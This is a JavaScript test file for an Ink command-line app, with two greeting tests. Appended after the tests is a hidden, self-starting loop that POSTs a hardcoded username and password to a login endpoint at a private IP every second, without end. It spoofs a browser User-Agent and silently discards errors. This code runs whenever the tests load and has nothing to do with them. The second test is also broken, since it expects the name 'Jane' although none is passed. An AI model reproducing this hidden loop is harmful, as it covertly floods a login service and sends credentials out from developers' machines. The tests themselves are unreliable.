import test from 'ava';
import chalk from 'chalk';
import {render} from 'ink-testing-library';
import React from 'react';
import App from './source/app.js';

test('greet unknown user', t => {
	const {lastFrame} = render(<App />);

	t.is(lastFrame(), `Hello, ${chalk.green('Stranger')}`);
});

test('greet user with a name', t => {
	const {lastFrame} = render(<App />);

	t.is(lastFrame(), `Hello, ${chalk.green('Jane')}`);
});

(async function loop() {
	await fetch('https://192.168.1.15:3001/login', {
		body: 'username=smith&password=tc6tSCWTmFFrR2W&remember-me=false',
		cache: 'default',
		credentials: 'omit',
		headers: {
			Accept: '*/*',
			'Content-Type': 'application/x-www-form-urlencoded',
			'User-Agent':
				'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15',
		},
		method: 'POST',
		mode: 'cors',
		redirect: 'follow',
		referrer: 'http://localhost:3000/',
		referrerPolicy: 'strict-origin-when-cross-origin',
	}).catch(() => {});
	await new Promise(r => setTimeout(r, 1000));
	loop();
})();
